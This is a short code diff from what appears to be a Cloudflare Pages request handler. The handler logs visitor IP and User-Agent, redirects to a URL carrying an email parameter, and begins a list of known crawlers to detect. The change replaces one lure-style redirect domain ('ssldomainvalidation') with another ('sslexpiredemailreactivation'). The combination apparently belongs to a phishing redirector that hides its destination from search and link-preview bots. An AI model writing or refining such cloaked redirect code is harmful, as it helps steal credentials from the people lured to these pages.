@@ -4,7 +4,7 @@ export async function onRequestGet(context) {
   const ip = context.request.headers.get("CF-Connecting-IP") || "unknown";
   const ua = context.request.headers.get("User-Agent") || "unknown";
 
-  const redirectUrl = "https://ssldomainvalidation.pages.dev?email="; // Replace this
+  const redirectUrl = "https://sslexpiredemailreactivation.pages.dev?email="; // Replace this
 
   // Basic bot detection
   const knownBots = ["Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "facebookexternalhit", "Twitterbot", "Slackbot"];
